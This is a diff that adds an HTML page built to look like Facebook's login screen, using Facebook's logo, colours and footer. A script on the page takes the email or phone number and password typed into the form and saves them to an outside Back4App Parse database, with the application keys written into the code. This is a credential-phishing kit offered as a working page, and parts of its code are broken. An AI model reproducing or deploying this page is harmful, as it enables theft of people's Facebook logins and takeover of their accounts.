@@ -1,0 +1,179 @@
+<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<meta content='width=device-width, initial-scale=1' name='viewport' user-scalable='0'/>
+<meta charset='UTF-8'/>
+<meta content='#3b5998' name='theme-color'/>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script>
+<script type="text/javascript" src="https://npmcdn.com/parse/dist/parse.min.js"></script>
+<link href='https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico' rel='icon'/>
+<title>Facebook login page</title>
+<style>
+   .header {
+      background: #3b5998;
+      box-sizing: border-box; 
+      height: 44px;
+      padding: 12;
+      position: relative;
+      width: 100%;
+      z-index: 12;
+      }
+      textarea:focus, input:focus{
+    outline: none;
+}
+
+* {
+  margin: 0;
+  padding: 0;
+}
+      html {font-family: Roboto, 'Droid Sans', Helvetica, sans-serif; -webkit-tap-highlight-color: transparent; cursor: context-menu;}
+      form {padding: 20px;}
+      input {
+        -webkit-appearance: none;
+      width: 100%;padding: 12px;
+      background: #f5f6f7;
+      border-radius: 5px;
+      border-style: none;
+      
+      }
+
+      #createButton{
+        font-size: 25px;
+      }
+
+      button {background: #1877f2;
+      border-radius: 4px;
+      border: none;
+      color: white;
+      width: 100%;
+      height: 40px;}
+      p {
+      width: 98%; 
+      color:#545454;
+      text-align: center; 
+      border-bottom: 1px solid #ccd0d5; 
+      line-height: 0.1em;
+      margin: 10px 0 20px; 
+      } 
+      p1 {
+      width: 98%; 
+      color:#576b95!important;
+      font-size: 12px;
+      text-decoration: none;
+      } 
+       p2 {
+      width: 98%; 
+      color:#848484!important;
+      font-size: 12px;
+      text-decoration: none;
+      } 
+      p span { 
+      background:#fff; 
+      padding:0 10px; 
+      }
+      .column {
+      float: left;
+      width: 25%;
+      padding: 2px;
+      left: 25%;
+      position: relative;
+        margin-top: 30px; }
+
+</style>
+<head>
+<link href='https://www.blogger.com/static/v1/widgets/14020288-widget_css_bundle.css' rel='stylesheet' type='text/css'/>
+<style id='page-skin-1' type='text/css'><!--
+/*
+body {
+font: $(body.font);
+color: $(body.text.color);
+background: $(body.background);
+padding: 0 $(content.shadow.spread) $(content.shadow.spread) $(content.shadow.spread);
+$(body.background.override) margin: 0;
+padding: 0;
+}
+
+--></style>
+
+</head>
+<body>
+<div class='main no-items section' id='main'></div>
+<!-- Please Keep The Credits -->
+<center>
+<div class='header' data-sigil='mChromeHeaderCenter'>
+    <a href='/'><img id="mylogo" height='20' src='https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/gf6iHxsw8zm.png' width='100'/></a>
+</div>
+<login>
+<form>
+<input id="username" placeholder="Email or phone number" type='text'/>
+<br/><br>
+<input id="password" placeholder='Password' type='password'/>
+<br/><br/>
+    <button class="btn-login" id="createButton">Login</button> 
+<br/>
+<br/>
+<a href='https://facebook.com/recover/initiate/' style='color: #7596c8!important;text-decoration: none;font-size: 15px;' tabindex='0'>Forgot Password?</a> <br>
+<br>
+<p><span>or</span></p>
+<br/>
+
+<a href='https://facebook.com/r.php' style='padding: 12px;background:#00a400;border:none;box-shadow: none;border-radius:4px;border:none;color:white;margin:-10px;text-decoration: none;0 -1px 0 rgba(0, 0, 0, .35);font-weight: bold;'>Create new account</a>
+<br/>
+<br/>
+<div class='row'>
+<div class='column'>
+<p2>Português (Brasil)</p2><br/>
+<p1 href='/'>Español</p1><br/>
+<p1 href='/'>Deutsch</p1><br/>
+<p1 href='/'>العربية</p1><br/>
+</div>
+<div class='column'>
+<p1 href='/'>English (US)</p1><br/>
+<p1 href='/'>Français (France)</p1><br/>
+<p1 href='/'>Italiano</p1><br/>
+</div>
+</div></form></login>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<p2>Facebook, Inc.</p2>
+</center>
+<div class='no-items section' id='main'></div>
+</body>
+<script>
+    Parse.serverURL = 'https://parseapi.back4app.com'; // This is your Server URL
+// Remember to inform BOTH the Back4App Application ID AND the JavaScript KEY
+Parse.initialize(
+  'lm59RlqT6R3nKbuQEkf9OtoBxz8sB2XnbMYsoYKb', // This is your Application ID
+  'saiHkSrLOlUvI25pF6DV3nteoL9F1HPZVFlBxKqE' // This is your Javascript key
+);
+    // Create a new User
+    async function createParseUser() {
+      // Creates a new Parse "User" object, which is created by default in your Parse app
+      let user = new Parse.players();
+      // Set the input values to the new "User" object
+      user.set("username", document.getElementById("username").value);
+      user.set("email", document.getElementById("email").value);
+      user.set("password", document.getElementById("password").value);
+      try {
+        // Call the save method, which returns the saved object if successful
+        user = await user.save();
+        if (user !== null) {
+          // Notify the success by getting the attributes from the "User" object, by using the get method (the id attribute needs to be accessed directly, though)
+          alert(
+            `New object created with success! ObjectId: ${
+              user.id
+            }, ${user.get("username")}`
+          );
+        }
+      } catch (error) {
+        alert(`Error: ${error.message}`);
+      }
+    }
+
+    // Add on click listener to call the create parse user function
+    document.getElementById("createButton").addEventListener("click", async function () {
+      createParseUser();
+    });
+  </script>
+</html>
